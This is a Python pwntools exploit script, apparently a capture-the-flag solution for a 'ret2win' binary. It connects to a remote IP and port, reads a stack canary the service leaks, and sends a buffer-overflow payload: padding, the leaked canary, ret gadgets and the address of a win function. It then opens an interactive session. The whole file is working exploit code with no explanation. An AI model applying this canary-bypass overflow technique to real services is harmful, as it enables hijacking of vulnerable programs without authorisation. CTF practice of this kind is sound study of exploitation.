from pwn import *
exe = './ret2win'
# p = process(exe)
p = remote('103.185.44.122',19002)
context.log_level = 'DEBUG'
p.recvuntil(b'you: ')
get = p.recvline().strip()
leak_cannary = int(get,16)
print(f'leak cannary -> {hex(leak_cannary)}')
win_address = 0x0000000000401236
payload = flat([
    b'A' * 104,
    p64(leak_cannary),
    # b'A' * 8,
    p64(0x000000000040101a),
    p64(0x000000000040101a),
    p64(win_address)

])

p.sendlineafter(b'payload: ', payload)
p.interactive()